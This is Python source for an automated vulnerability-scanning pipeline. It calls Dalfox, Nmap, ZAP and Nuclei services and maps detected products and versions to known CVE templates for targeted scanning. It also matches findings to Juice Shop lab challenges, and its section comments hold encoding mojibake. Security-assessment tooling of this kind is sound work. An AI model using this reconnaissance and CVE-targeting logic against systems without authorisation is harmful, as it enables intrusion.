    auth_headers = getattr(auth_ctx, "headers", None) or None

    async def _run(coro):
        try:
            return await coro
        except Exception as exc:
            logger.warning("[ExtProbe] deep sub-probe error: %s", exc)
            return []

    logger.info("[P3] Extended probes deep: running 4 probes on %d endpoints", len(all_urls))
    results = await asyncio.gather(
        _run(_ext_probe_d_sensitive(target, auth_headers)),
        _run(_probe_ssrf(target, auth_headers=auth_headers)),
        _run(_probe_xxe(target)),
        _run(_probe_reflected_xss(target)),
        return_exceptions=True,
    )
    all_findings: List[Dict] = []
    for result in results:
        if isinstance(result, list):
            all_findings.extend(result)
    return {"findings": all_findings, "total": len(all_findings)}


async def _call_dalfox(
    target:       str,
    timeout:      int = 120,
    urls:         Optional[List[str]] = None,
    auth_headers: Optional[Dict[str, Any]] = None,
) -> Dict[str, Any]:
    """XSS detection via Dalfox (defensif, assessment uniquement)."""
    default = {
        "target": target, "error": None,
        "findings": [], "total": 0, "by_severity": {},
    }
    if not target.startswith(("http://", "https://")):
        target_url = f"http://{target}"
    else:
        target_url = target

    _MAX_URL_RETRY = 3

    async def _do_call(try_urls: Optional[List[str]]) -> Dict[str, Any]:
        payload: Dict[str, Any] = {"target": target_url, "timeout": timeout, "deep_mode": False}
        if try_urls:
            payload["urls"] = try_urls
        if auth_headers:
            payload["auth_headers"] = auth_headers
        # Add 90s headroom so the HTTP client doesn't race against Dalfox's own timeout
        http_timeout = float(timeout) + 90
        async with httpx.AsyncClient(timeout=httpx.Timeout(http_timeout, connect=30.0)) as client:
            resp = await client.post(
                f"{settings.DALFOX_URL}/scan",
                json=payload,
            )
            resp.raise_for_status()
            return resp.json()

    try:
        return await _do_call(urls)
    except httpx.TimeoutException:
        if urls and len(urls) > _MAX_URL_RETRY:
            logger.warning("[Dalfox] timeout with %d URLs -- retrying with max %d", len(urls), _MAX_URL_RETRY)
            try:
                return await _do_call(urls[:_MAX_URL_RETRY])
            except httpx.TimeoutException:
                default["error"] = "Dalfox service HTTP request timed out (retry with %d URLs)" % _MAX_URL_RETRY
            except Exception as exc:
                default["error"] = str(exc)
        else:
            default["error"] = "Dalfox service HTTP request timed out"
    except httpx.ConnectError:
        default["error"] = "Dalfox service unavailable (container not running?)"
    except Exception as exc:
        default["error"] = str(exc)
    return default


async def _call_nmap(target: str, additional_ports: Optional[List[int]] = None) -> Dict[str, Any]:
    payload: Dict[str, Any] = {"target": target}
    if additional_ports:
        payload["additional_ports"] = additional_ports
    default = {
        "target": target, "error": None, "data": {}, "summary": {},
        "additional_ports_from_zap": additional_ports or [],
    }
    try:
        async with httpx.AsyncClient(timeout=httpx.Timeout(360.0)) as client:
            resp = await client.post(f"{settings.NMAP_URL}/scan", json=payload)
            resp.raise_for_status()
            return resp.json()
    except httpx.ConnectError:
        default["error"] = "Nmap service unavailable (container not running?)"
    except httpx.TimeoutException:
        default["error"] = "Nmap service HTTP request timed out"
    except Exception as exc:
        default["error"] = str(exc)
    return default


async def _call_zap(
    target:       str,
    auth_headers: Optional[Dict[str, Any]] = None,
    auth_cookies: Optional[Dict[str, Any]] = None,
    ajax_spider:  bool = False,
) -> Dict[str, Any]:
    default = {
        "target": target, "error": None, "alerts": [], "total": 0,
        "by_risk": {}, "endpoints": [], "form_params": [],
        "abnormal_headers": [], "implicit_ports": [],
    }
    # Mode web-app approfondi : AJAX spider active (indispensable pour crawler les
    # SPA Angular/React ou le spider HTML classique ne voit aucune page) + temps
    # suffisant pour que le scan actif (XSS, SQLi, XXE) se termine.
    payload: Dict[str, Any] = {
        "target":         target,
        "spider_minutes": 2,
        "timeout":        480,
        "ajax_spider":    ajax_spider,
        "max_depth":      3,
        "max_children":   20,
    }
    if auth_headers:
        payload["headers"] = auth_headers
    if auth_cookies:
        payload["cookies"] = auth_cookies
    try:
        async with httpx.AsyncClient(timeout=httpx.Timeout(540.0)) as client:
            resp = await client.post(f"{settings.ZAP_URL}/scan", json=payload)
            resp.raise_for_status()
            return resp.json()
    except httpx.ConnectError:
        default["error"] = "ZAP service unavailable (container not running?)"
    except httpx.TimeoutException:
        default["error"] = "ZAP service HTTP request timed out"
    except Exception as exc:
        default["error"] = str(exc)
    return default


async def _wait_for_target(target: str, max_retries: int = 6) -> bool:
    """GET sur la cible (timeout 8s). Retente jusqu'a max_retries fois avec 10s entre chaque.
    Retourne True si la cible repond, False sinon. Ne bloque jamais le pipeline."""
    url = target if target.startswith(("http://", "https://")) else f"http://{target}"
    for attempt in range(1, max_retries + 1):
        try:
            async with httpx.AsyncClient(
                timeout=httpx.Timeout(8.0), verify=False, follow_redirects=True
            ) as client:
                resp = await client.get(url)
            if resp.status_code < 500:
                logger.info("[HEALTH] target=%s OK -- continue", target)
                return True
        except Exception as exc:
            logger.warning("[HEALTH] target=%s KO (attempt %d/%d): %s", target, attempt, max_retries, exc)
        if attempt < max_retries:
            await asyncio.sleep(10)
    logger.warning("[HEALTH] target=%s KO after %d attempts  --  continue anyway", target, max_retries)
    return False


async def _call_nuclei(
    target:          str,
    templates:       Optional[List[str]] = None,
    tags:            Optional[List[str]] = None,
    extra_targets:   Optional[List[str]] = None,
    tech_stack:      Optional[List[str]] = None,
    scan_categories: Optional[List[str]] = None,
    auth_headers:    Optional[Dict[str, Any]] = None,
    auth_cookies:    Optional[Dict[str, Any]] = None,
    severity:        Optional[str] = None,
) -> Dict[str, Any]:
    payload: Dict[str, Any] = {"target": target, "timeout": 600}
    if templates:
        payload["templates"] = templates
    if tags:
        payload["tags"] = tags
    if extra_targets:
        payload["extra_targets"] = extra_targets
    if tech_stack:
        payload["tech_stack"] = tech_stack
    if scan_categories:
        payload["scan_categories"] = scan_categories
    if auth_headers:
        payload["headers"] = auth_headers
    if auth_cookies:
        payload["cookies"] = auth_cookies
    if severity:
        payload["severity"] = severity
    default = {
        "target": target, "error": None, "findings": [], "total": 0,
        "by_severity": {}, "max_cvss": None,
        "templates_used": templates or [], "tags_used": tags or [],
    }
    try:
        async with httpx.AsyncClient(timeout=httpx.Timeout(650.0)) as client:
            resp = await client.post(f"{settings.NUCLEI_URL}/scan", json=payload)
            resp.raise_for_status()
            return resp.json()
    except httpx.ConnectError:
        default["error"] = "Nuclei service unavailable (container not running?)"
    except httpx.TimeoutException:
        default["error"] = "Nuclei service HTTP request timed out"
    except Exception as exc:
        default["error"] = str(exc)
    return default


# a"EURa"EUR Helpers DB a"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EUR


def _get_db_session():
    from app.database import SessionLocal
    return SessionLocal()


def _add_log(db, scan_id: str, message: str, level: str = "info") -> None:
    from app.models.log import ScanLog
    db.add(ScanLog(
        id=uuid.uuid4(),
        scan_id=uuid.UUID(scan_id),
        level=level,
        message=message,
        created_at=datetime.utcnow(),
    ))
    db.flush()


def _update_scan(db, scan, **kwargs) -> None:
    for key, value in kwargs.items():
        setattr(scan, key, value)
    scan.updated_at = datetime.utcnow()
    db.commit()
    db.refresh(scan)


# a"EURa"EUR Redis publish a"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EUR


def _publish(
    r: sync_redis.Redis,
    scan_id: str,
    status: str,
    progress: int,
    message: str,
    data: Optional[Dict[str, Any]] = None,
) -> None:
    r.publish("scan_progress", json.dumps({
        "scan_id":   scan_id,
        "status":    status,
        "progress":  progress,
        "message":   message,
        "data":      data or {},
        "timestamp": datetime.utcnow().isoformat(),
    }))


# a"EURa"EUR Helpers pipeline a"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EUR


def _extract_discovered_ips(nmap_result: Dict[str, Any], initial_target: str) -> List[str]:
    ips: set = set()
    for host in nmap_result.get("data", {}).get("hosts", []):
        for addr in host.get("addresses", []):
            ip = addr.get("addr", "")
            if addr.get("addrtype") == "ipv4" and ip and ip != initial_target:
                ips.add(ip)
    return list(ips)


def _extract_ports_from_zap(zap_result: Dict[str, Any]) -> List[int]:
    return zap_result.get("implicit_ports", [])


# a"EURa"EUR Nuclei context builder v2 a"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EUR
# Uses ALL available sources: Nmap, Subfinder, FFUF, Katana, Nmap HTTP probes

# Service name -> base tags
_SVC_TAGS: Dict[str, List[str]] = {
    "http":          ["exposure", "misconfig"],
    "https":         ["http", "ssl", "tls"],
    "ftp":           ["ftp", "network", "default-logins"],
    "ssh":           ["ssh", "network"],
    "smtp":          ["smtp", "network"],
    "smb":           ["smb", "network"],
    "mysql":         ["mysql", "network", "default-logins"],
    "postgres":      ["postgresql", "network"],
    "postgresql":    ["postgresql", "network"],
    "redis":         ["redis", "network"],
    "mongodb":       ["mongodb", "network"],
    "rdp":           ["rdp", "network"],
    "telnet":        ["telnet", "network", "default-logins"],
    "vnc":           ["vnc", "network"],
    "ldap":          ["ldap", "network"],
    "ldaps":         ["ldap", "network"],
    "elastic":       ["elasticsearch", "network"],
    "elasticsearch": ["elasticsearch", "network"],
    "kafka":         ["network"],
    "amqp":          ["network"],
    "docker":        ["docker", "network"],
    "kubernetes":    ["kubernetes", "k8s"],
    "jenkins":       ["jenkins", "default-logins"],
    "grafana":       ["grafana"],
    "kibana":        ["kibana", "elasticsearch"],
    "etcd":          ["network", "etcd"],
}

# Product keyword -> (tags, CVE template IDs)
_PRODUCT_MAP: Dict[str, tuple] = {
    # Web servers
    "apache":       (["apache", "http"], []),
    "nginx":        (["nginx", "http"], []),
    "iis":          (["iis", "microsoft", "http"], []),
    "litespeed":    (["litespeed", "http"], []),
    "openresty":    (["nginx", "lua", "http"], []),
    "caddy":        (["http"], []),
    # App servers
    "tomcat":       (["tomcat", "apache", "java"], ["CVE-2020-1938", "CVE-2019-0232", "CVE-2017-12615"]),
    "jboss":        (["jboss", "java"],            ["CVE-2017-12149", "CVE-2015-7501"]),
    "weblogic":     (["oracle", "weblogic", "java"],["CVE-2020-14882", "CVE-2019-2725", "CVE-2018-2628"]),
    "websphere":    (["ibm", "websphere", "java"], ["CVE-2020-4450"]),
    "glassfish":    (["glassfish", "java"],        ["CVE-2017-1000028"]),
    "jetty":        (["jetty", "java"],            []),
    # CMS
    "wordpress":    (["wordpress", "wp-plugin"],   []),
    "drupal":       (["drupal"],                   ["CVE-2018-7600", "CVE-2019-6340", "CVE-2021-41182"]),
    "joomla":       (["joomla"],                   ["CVE-2015-8562", "CVE-2019-10945"]),
    "magento":      (["magento"],                  ["CVE-2019-8118", "CVE-2022-24086"]),
    "typo3":        (["typo3"],                    ["CVE-2019-12747"]),
    # Languages / frameworks
    "php":          (["php"],                      []),
    "laravel":      (["laravel", "php"],           ["CVE-2021-3129", "CVE-2018-15133"]),
    "symfony":      (["symfony", "php"],           ["CVE-2021-41268"]),
    "spring":       (["spring", "springboot", "java"], ["CVE-2022-22965", "CVE-2022-22950", "CVE-2022-22963"]),
    "log4j":        (["log4j", "java"],            ["CVE-2021-44228", "CVE-2021-45046", "CVE-2021-45105"]),
    "struts":       (["struts", "java"],           ["CVE-2017-5638", "CVE-2018-11776"]),
    "rails":        (["rails", "ruby"],            ["CVE-2019-5418"]),
    "node":         (["nodejs", "node"],           []),
    "express":      (["express", "nodejs"],        []),
    "django":       (["django", "python"],         []),
    "flask":        (["flask", "python"],          []),
    "dotnet":       (["asp", "dotnet"],            []),
    # Email
    "exchange":     (["microsoft", "exchange"],    ["CVE-2021-34473", "CVE-2021-26855", "CVE-2022-41082"]),
    "postfix":      (["smtp", "network"],          []),
    "sendmail":     (["smtp", "network"],          []),
    # DevOps / CI
    "jenkins":      (["jenkins", "default-logins"],["CVE-2019-1003000", "CVE-2018-1000861", "CVE-2024-23897"]),
    "gitlab":       (["gitlab"],                   ["CVE-2021-22205", "CVE-2022-2884", "CVE-2023-7028"]),
    "github":       (["github"],                   []),
    "grafana":      (["grafana"],                  ["CVE-2021-43798", "CVE-2022-31107"]),
    "kibana":       (["kibana", "elasticsearch"],  ["CVE-2019-7609"]),
    "prometheus":   (["prometheus", "misconfiguration"], []),
    "sonarqube":    (["sonarqube"],                []),
    "nexus":        (["nexus"],                    ["CVE-2019-7238", "CVE-2020-10199"]),
    "artifactory":  (["jfrog"],                    ["CVE-2020-7931"]),
    # Infrastructure
    "openssh":      (["ssh", "openssh"],           []),
    "openssl":      (["ssl", "tls"],               []),
    "redis":        (["redis"],                    ["redis-unauthenticated-access"]),
    "mongodb":      (["mongodb"],                  ["mongodb-unauth"]),
    "elastic":      (["elasticsearch", "network"], ["CVE-2014-3120", "CVE-2015-1427"]),
    "rabbitmq":     (["network", "default-logins"],["CVE-2023-46118"]),
    "consul":       (["network", "misconfiguration"], []),
    "vault":        (["network"],                  []),
    "etcd":         (["network", "misconfiguration"], []),
    "docker":       (["docker"],                   ["CVE-2019-5736"]),
    "kubernetes":   (["kubernetes", "k8s"],        ["CVE-2018-1002105"]),
    # Cloud-specific
    "minio":        (["cloud", "s3"],              ["CVE-2023-28432"]),
    "keycloak":     (["keycloak"],                 ["CVE-2023-6927", "CVE-2022-4361"]),
    "confluence":   (["confluence", "atlassian"],  ["CVE-2022-26134", "CVE-2023-22515"]),
    "jira":         (["jira", "atlassian"],        ["CVE-2021-26086"]),
    "zimbra":       (["zimbra"],                   ["CVE-2022-37042"]),
    "citrix":       (["citrix"],                   ["CVE-2023-3519", "CVE-2019-19781"]),
    "fortinet":     (["fortinet"],                 ["CVE-2022-40684", "CVE-2018-13382"]),
    "palo-alto":    (["paloalto"],                 ["CVE-2020-2021"]),
    "vmware":       (["vmware"],                   ["CVE-2021-21985", "CVE-2021-22005"]),
}

# Version prefix -> CVE IDs when product detected with specific version
_VERSION_CVE_MAP: List[tuple] = [
    ("apache",   "2.4.49", ["CVE-2021-41773", "CVE-2021-42013"]),
    ("apache",   "2.4.50", ["CVE-2021-41773", "CVE-2021-42013"]),
    ("log4",     "2.",     ["CVE-2021-44228", "CVE-2021-45046", "CVE-2021-45105"]),
    ("spring",   "5.",     ["CVE-2022-22965"]),
    ("spring",   "2.",     ["CVE-2022-22963"]),
    ("openssh",  "7.2",    ["CVE-2016-0777"]),
    ("openssh",  "8.",     ["CVE-2023-38408"]),
    ("php",      "7.1",    ["CVE-2019-11043"]),
    ("php",      "7.2",    ["CVE-2019-11043"]),
    ("php",      "7.3",    ["CVE-2019-11043"]),
    ("php",      "8.0",    []),
    ("openssl",  "1.0",    ["CVE-2014-0160"]),   # Heartbleed
    ("openssl",  "1.1",    ["CVE-2022-0778"]),
    ("drupal",   "7.",     ["CVE-2014-3704", "CVE-2018-7600"]),
    ("drupal",   "8.",     ["CVE-2018-7600", "CVE-2019-6340"]),
    ("jenkins",  "2.",     ["CVE-2024-23897"]),
]

# Scan categories to always include for web targets
_BASE_WEB_SCAN_CATEGORIES: List[str] = [
    "exposure",
    "misconfig",
    "panel",
    "api",
]

# FFUF category -> Nuclei tags
_FFUF_TO_NUCLEI: Dict[str, List[str]] = {
    "admin_panel":   ["panel", "default-logins"],
    "git_exposure":  ["git-config", "exposure"],
    "config_file":   ["exposure", "misconfig"],
    "backup_file":   ["exposure"],
    "secret_file":   ["exposure"],
    "api_docs":      ["api", "swagger"],
    "api_route":     ["api"],
    "debug_endpoint":["misconfig", "exposure"],
    "installer":     ["misconfig"],
    "credentials":   ["exposure", "default-logins"],
    "backup_archive":["exposure"],
}

# Tech string -> Nuclei tags (for Subfinder/Katana/HTTP probe technologies)
_TECH_TO_NUCLEI: Dict[str, List[str]] = {
    "wordpress":   ["wordpress", "wp-plugin", "cve"],
    "drupal":      ["drupal", "cve"],
    "joomla":      ["joomla", "cve"],
    "apache":      ["apache", "cve", "misconfig"],
    "nginx":       ["nginx", "cve", "misconfig"],
    "iis":         ["iis", "microsoft", "cve"],
    "php":         ["php", "cve"],
    "laravel":     ["laravel", "php", "cve"],
    "django":      ["django", "misconfig"],
    "spring":      ["spring", "java", "cve"],
    "tomcat":      ["tomcat", "apache", "cve"],
    "jenkins":     ["jenkins", "cve", "default-logins"],
    "gitlab":      ["gitlab", "cve"],
    "grafana":     ["grafana", "cve"],
    "react":       ["exposure", "misconfig"],
    "angular":     ["exposure", "misconfig"],
    "vue":         ["exposure", "misconfig"],
    "next.js":     ["exposure", "misconfig"],
    "cloudflare":  ["cloudflare", "waf-bypass"],
    "aws":         ["aws", "cloud", "s3"],
    "azure":       ["azure", "cloud"],
    "asp.net":     ["asp", "dotnet", "cve"],
    "node":        ["nodejs", "node"],
    "express":     ["express", "nodejs"],
    "flask":       ["flask", "python"],
    "confluence":  ["confluence", "atlassian", "cve"],
    "jira":        ["jira", "atlassian", "cve"],
    "elasticsearch":["elasticsearch", "network", "cve"],
    "kibana":      ["kibana", "elasticsearch"],
    "redis":       ["redis", "network"],
    "mongodb":     ["mongodb", "network"],
    "keycloak":    ["keycloak", "cve"],
    "vmware":      ["vmware", "cve"],
    "citrix":      ["citrix", "cve"],
}


def _build_nuclei_context(
    nmap_result:      Dict[str, Any],
    subfinder_result: Optional[Dict[str, Any]] = None,
    ffuf_result:      Optional[Dict[str, Any]] = None,
    katana_result:    Optional[Dict[str, Any]] = None,
) -> Dict[str, Any]:
    """
    Build enriched Nuclei context from ALL available scanner data.
    Returns tags, template_ids, tech_stack, scan_categories, service_summary.
    """
    tags:             set = set()
    template_ids:     set = set()
    service_summary:  List[str] = []
    tech_stack:       List[str] = []

    # a"EURa"EUR 1. Nmap service/product -> tags + CVEs a"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EUR
    for host in nmap_result.get("data", {}).get("hosts", []):
        for port in host.get("ports", []):
            if port.get("state") != "open":
                continue
            svc      = port.get("service", "").lower()
            product  = port.get("product", "").lower()
            version  = port.get("version", "").lower()
            port_num = port.get("port", 0)

            for svc_key, svc_tags in _SVC_TAGS.items():
                if svc_key in svc or svc_key in product:
                    tags.update(svc_tags)

            for prod_key, (prod_tags, prod_templates) in _PRODUCT_MAP.items():
                if prod_key in product or prod_key in svc:
                    tags.update(prod_tags)
                    template_ids.update(prod_templates)

            for prod_key, ver_prefix, ver_templates in _VERSION_CVE_MAP:
                if prod_key in product and version.startswith(ver_prefix):
                    template_ids.update(ver_templates)

            if port_num in (445, 139) or "smb" in svc:
                tags.update(["smb", "network"])
                template_ids.update(["CVE-2017-0143", "CVE-2017-0144"])

            if product or svc:
                service_summary.append(f"{port_num}/{svc} {product} {version}".strip())

        # a"EURa"EUR 2. Nmap HTTP probe technologies (from our enhanced nmap/server.py) a"EURa"EUR
        for port in host.get("ports", []):
            for tech in port.get("technologies", []):
                tech_lower = tech.lower()
                tech_stack.append(tech)
                for kw, kw_tags in _TECH_TO_NUCLEI.items():
                    if kw in tech_lower or tech_lower in kw:
                        tags.update(kw_tags)
                        break
            # CDN info from HTTP probe
            probe = port.get("http_probe") or {}
            cdn = probe.get("cloud") or probe.get("cdn") or ""
            if cdn:
                for kw, kw_tags in _TECH_TO_NUCLEI.items():
                    if kw in cdn.lower():
                        tags.update(kw_tags)

    # a"EURa"EUR 3. Subfinder technologies a"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EUR
    for tech in (subfinder_result or {}).get("technologies", []):
        tech_lower = tech.lower()
        tech_stack.append(tech)
        for kw, kw_tags in _TECH_TO_NUCLEI.items():
            if kw in tech_lower or tech_lower in kw:
                tags.update(kw_tags)
                break

    # CDN providers from Nmap summary
    for cdn in nmap_result.get("summary", {}).get("cdn_providers", []):
        tech_stack.append(cdn)
        for kw, kw_tags in _TECH_TO_NUCLEI.items():
            if kw in cdn.lower():
                tags.update(kw_tags)
                break

    # a"EURa"EUR 4. FFUF severity findings -> targeted tags a"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EUR
    ffuf_by_sev = (ffuf_result or {}).get("by_severity", {})
    for severity_level in ("critical", "high", "medium"):
        for ep in ffuf_by_sev.get(severity_level, [])[:15]:
            cat = ep.get("category", "")
            if cat in _FFUF_TO_NUCLEI:
                tags.update(_FFUF_TO_NUCLEI[cat])
            # If admin panel found -> add panels + default-logins
            if "admin" in ep.get("url", "").lower():
                tags.update(["panel", "default-logins"])

    # a"EURa"EUR 5. Katana JS framework detection a"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EUR
    for ep in (katana_result or {}).get("endpoints", [])[:50]:
        cat = ep.get("category", "")
        if cat in ("api", "js"):
            tags.update(["api", "exposure"])

    # a"EURa"EUR 6. Scan categories: always include base coverage for web targets a"EURa"EURa"EURa"EURa"EURa"EURa"EUR
    # Added when there's any HTTP service or the target has web endpoints
    has_web = any(
        "http" in str(nmap_result.get("summary", {}).get("services", {}).get(str(p), {}).get("name", "")).lower()
        or p in {80, 443, 8080, 8443, 8888, 3000}
        for p in nmap_result.get("summary", {}).get("ports", [])
    )
    if has_web or not nmap_result.get("summary", {}).get("ports"):
        tags.update(["exposure", "misconfig", "panel", "api"])

    # a"EURa"EUR 7. Ensure cloud bucket scanning if any cloud provider detected a"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EUR
    if any(k in " ".join(tech_stack).lower() for k in ["aws", "azure", "gcp", "s3", "cloud"]):
        tags.update(["cloud", "aws", "azure", "s3", "bucket"])

    tech_stack = list(dict.fromkeys(tech_stack))  # deduplicate

    return {
        "tags":             sorted(tags),
        "template_ids":     sorted(template_ids),
        "service_summary":  service_summary[:20],
        "tech_stack":       tech_stack[:20],
        "scan_categories":  _BASE_WEB_SCAN_CATEGORIES,
    }


# a"EURa"EUR Detection automatique du serveur (Server: / X-Powered-By:) a"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EUR
# Mapping mot-cle serveur -> tags Nuclei. 100 % generique : on lit les headers
# HTTP de la reponse et on deduit les tags automatiquement. Aucun nom d'app /
# aucune techno specifique en dur.

_SERVER_HEADER_TO_TAGS: Dict[str, List[str]] = {
    "nginx":      ["nginx"],
    "openresty":  ["nginx", "lua"],
    "apache":     ["apache"],
    "httpd":      ["apache"],
    "iis":        ["iis", "microsoft"],
    "microsoft":  ["iis", "microsoft"],
    "litespeed":  ["litespeed"],
    "caddy":      ["http"],
    "tomcat":     ["tomcat", "apache", "java"],
    "coyote":     ["tomcat", "java"],
    "jetty":      ["jetty", "java"],
    "jboss":      ["jboss", "java"],
    "wildfly":    ["jboss", "java"],
    "weblogic":   ["weblogic", "oracle", "java"],
    "glassfish":  ["glassfish", "java"],
    "gunicorn":   ["python"],
    "uvicorn":    ["python"],
    "werkzeug":   ["flask", "python"],
    "waitress":   ["python"],
    "express":    ["express", "nodejs"],
    "node":       ["nodejs"],
    "php":        ["php"],
    "phusion":    ["ruby", "rails"],
    "passenger":  ["ruby", "rails"],
    "puma":       ["ruby", "rails"],
    "unicorn":    ["ruby", "rails"],
    "kestrel":    ["asp", "dotnet"],
    "asp.net":    ["asp", "dotnet"],
    "aspnet":     ["asp", "dotnet"],
    "coldfusion": ["coldfusion"],
    "cloudflare": ["cloudflare"],
    "akamai":     ["akamai"],
    "envoy":      ["misconfiguration"],
}

# Categories generiques TOUJOURS incluses (jamais specifiques a une techno).
_ALWAYS_INCLUDE_TAGS: List[str] = ["exposure", "misconfig", "xss", "sqli", "unauth", "panel", "discovery", "tech", "headers", "cors", "csp", "redirect"]


async def _fetch_server_tags(target: str, timeout: int = 8) -> Dict[str, Any]:
    """
    Lit Server: / X-Powered-By: (+ X-Generator, X-AspNet-Version) de la cible et
    deduit automatiquement des tags Nuclei via _SERVER_HEADER_TO_TAGS.
    Toujours rapide (timeout court) pour ne pas ralentir le pipeline.
    Retourne {tags, server, powered_by, tech}. Les categories generiques
    (_ALWAYS_INCLUDE_TAGS) sont toujours presentes, meme si la cible est
    injoignable ou ne renvoie aucun header de techno.
    """
    url = target if target.startswith(("http://", "https://")) else f"http://{target}"
    out: Dict[str, Any] = {"tags": [], "server": "", "powered_by": "", "tech": [], "status_code": 0}
    tags: set = set(_ALWAYS_INCLUDE_TAGS)
    try:
        async with httpx.AsyncClient(
            timeout=httpx.Timeout(float(timeout + 10)), verify=False, follow_redirects=True,
        ) as client:
            resp = await client.get(url, headers={"User-Agent": "Mozilla/5.0 (compatible; AuditScan/3.0)"})
        out["status_code"] = resp.status_code
        h          = resp.headers
        server     = h.get("server", "")
        powered_by = h.get("x-powered-by", "")
        generator  = h.get("x-generator", "")
        aspnet_ver = h.get("x-aspnet-version", "") or h.get("x-aspnetmvc-version", "")
        out["server"]     = server
        out["powered_by"] = powered_by
        blob = " ".join([server, powered_by, generator, aspnet_ver]).lower()
        for kw, kw_tags in _SERVER_HEADER_TO_TAGS.items():
            if kw in blob:
                tags.update(kw_tags)
                out["tech"].append(kw)
        if aspnet_ver:
            tags.update(["asp", "dotnet"])
    except Exception:
        # cible injoignable / pas de service HTTP  --  on garde les tags generiques
        pass
    out["tags"] = sorted(tags)
    out["tech"] = sorted(set(out["tech"]))
    return out


# a"EURa"EUR SOC Dashboard Report builder a"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EUR


def _match_lab_challenges(
    challenges: List[Dict[str, Any]],
    correlated_findings: List[Dict[str, Any]],
) -> List[Dict[str, Any]]:
    """
    Strict whitelist-based matching. Only keywords that belong to one of three
    tightly-scoped whitelists can trigger a match:
      1. App-specific / proper-noun terms unique to Juice Shop
      2. Endpoint route identifiers -- matched against matched_at URL only
         (not just a finding title) to avoid false positives from shared words
      3. Specific vulnerability technique terms (jwt, xxe, ssrf, ...)

    Generic action verbs and broad security vocabulary ("bypass", "leak",
    "retrieve", "exposure", "injection", ...) are implicitly excluded because
    they are simply not in any whitelist. If no whitelisted keyword is found
    in a challenge name, that challenge skips the match loop entirely and stays
    only in detected_challenges. Zero matches is correct behavior when no
    direct evidence exists.
    """
    # Filter out lab_challenge_api mirror findings -- they contain the challenge
    # name by construction and would cause every challenge to auto-match itself.
    _REAL_SCAN_SOURCES = {
        "sqlmap", "nuclei", "zap", "nikto", "wapiti",
        "ffuf", "dalfox", "gitleaks", "katana", "nmap",
        # Custom probes
        "stored_xss_probe", "jwt_probe", "ftp_nullbyte_probe",
        "reflected_xss_probe", "dom_xss_probe", "xxe_probe",
        "ssrf_probe", "user_enum_probe", "weak_password_probe",
        "headers_probe", "anti_automation_probe", "captcha_bypass_probe",
        "auth_tester", "rate_limit_tester", "extended_prober",
        "idor", "fallback",
    }
    real_findings = [
        f for f in correlated_findings
        if any(s.lower() in _REAL_SCAN_SOURCES for s in f.get("sources", []))
    ]

    # Whitelist 1: terms specific to Juice Shop or unusual proper nouns that
    # would not appear in a generic scanner finding by coincidence.
    _APP_SPECIFIC: set = {
        "bjoern", "juicy", "blockchain", "captcha", "christmas", "ribbon",
        "nft", "wallet", "chatbot", "deluxe", "kitten", "nullbyte",
        "steganography", "forged", "primocrux", "recycled",
        # Anti-automation / captcha
        "anti-automation", "automation", "captcha",
        # Weak password / policy
        "policy", "breached",
    }

    # Whitelist 2: concrete endpoint/route names.
    # Rule: the keyword must appear in matched_at URL (path segment), NOT just
    # in the finding title -- a title can mention "login" in an advisory context
    # while testing a completely different endpoint.
    _ENDPOINT_TERMS: set = {
        "feedback", "search", "login", "register", "whoami", "challenges",
